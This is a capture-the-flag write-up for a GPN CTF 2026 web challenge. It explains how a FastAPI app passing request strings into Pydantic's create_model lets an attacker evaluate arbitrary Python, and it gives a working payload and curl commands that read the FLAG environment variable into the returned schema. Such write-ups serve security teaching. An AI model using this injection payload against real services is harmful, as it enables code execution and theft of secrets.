---
tags:
  - web
  - rce
  - gpn-ctf-2026
---

# Restaurant Builder

## Overview

| | |
|---|---|
| **Event** | GPN CTF 2026 |
| **Category** | Web, Introduction |
| **Difficulty** | Easy |
| **Author** | uxxct |

!!! info "Challenge Description"
    So you want to build your own restaurant? Well, we obviously can't just let you do that. Please first submit blueprints and exact descriptions for the building, all the furniture and every single item you plan to have in the restaurant.

The challenge also provides us a handout file and allows us to spin up a web instance. We can analyse the handout to understand how to exploit the source for the flag.

## Recon

Visting the running instance, shows a page displaying: `"The department of restaurant safety inspections thanks you for your cooperation."` 

I'll turn to the handout for now. It ships with the full source plus build/run setup:
```text
Dockerfile
src/main.py
src/pyproject.toml
src/uv.lock
```
The Dockerfile tells us how to run it and where the flag lives in the program (this version has a dummy value).
```dockerfile
# docker run --rm -p 1337:1337 -e FLAG="GPNCTF{this_is_a_dummy_flag}" restaurant-builder
ENTRYPOINT ["uv", "run", "gunicorn", "-k", "uvicorn.workers.UvicornWorker", "main:app", ...]
```

The flag is passed in as the `FLAG` **environment variable**, so whatever primitive we get needs to reach `os.environ`.

`main.py` is a small FastAPI app. The interesting route takes a user-controlled dict straight into Pydantic's `create_model`:
```python
description = {k: v for k,v in description.items() if not k.startswith("__")}
Blueprint = create_model(name, **description)
```
`description` in the request body (`Dict[str,str]`), so every value we send is splatted in as a `create_model` field definition. We need to understand `create_model` to see how it handles our strings. 

`create_model` comes from `pydantic`. We can see the version is Pydantic 2.13.4 in our `uv.lock` file, so that's the source to read:
```bash
python3 -c "from pydantic import create_model; print(create_model.__doc__)"
```

## Vulnerability
There is a warning in the docstring - _"This function may execute arbitrary code contained in field annotations, if string references need to be evaluated."_

This is our path to compromise.

The body values are plain strings (not tuples), they fall into the `else` branch and become **type annotations**, meaning they are string forward references Pydantic will `eval()` 

The bug is in `POST /blueprint/{name}`
```python
description = {k: v for k,v in description.items() if not k.startswith("__")}
Blueprint = create_model(name, **description)
```

The body is `Dict[str,str]` so every value is a plain string. Looking at Pydantic 2.13.4's `create_model`, a field definition that isn't `2-tuple` falls into the `else` branch:

```python
else:
    annotations[f_name] = f_def   # string becomes annotation
```

Our string becomes a type annotation. This is a forward reference Pydantic evaluates with `eval()`

The `__` prefix filter only blocks special kwargs like `__base__/__config__` but does nothing to stop arbitrary expressions in a field annotation. This is a clean Python eval primitive.


## Exfiltration

The flag is in the `FLAG` env var (we can see this in the docker command where it is run with a dummy flag).

`GET /blueprint/{name}` returns `model_json_schema()` so the trick is to make the annotation eval to a type whose schema *contains* the flag.

`typing.Literal["..."]` renders as `{"const":"..."}` in JSON Schema so:
```python
__import__('typing').Literal[__import__('os').environ['FLAG']]
```
bakes the live flag value straight into the returned schema.

I verified this locally and the schema returned - `"const": "GPNCTF{this_is_a_dummy_flag}"`

## Exploit

We need to send an evil blueprint and then request it. 

Note that we need to use a fresh blueprint name (repeat names return `409`).


```bash
HOST=https://poached-apple-infused-with-whipped-ponzu-p7qd.gpn24.ctf.kitctf.de

# Post evil blueprint
curl -s -X POST "$HOST/blueprint/pwn1" \
  -H 'Content-Type: application/json' \
  -d '{"x": "__import__('"'"'typing'"'"').Literal[__import__('"'"'os'"'"').environ['"'"'FLAG'"'"']]"}'

# Request blueprint
curl -s "$HOST/blueprint/pwn1"
```


The flag comes back inside the schema as the `const` of property `x`.

## Flag

!!! success "Flag"
    ```text
    GPNCTF{anD_ONe_0r_TW0_RcES_lAteR_THeY_8U1lt_h4ppI1y_eVeR_4f7Er}
    ```
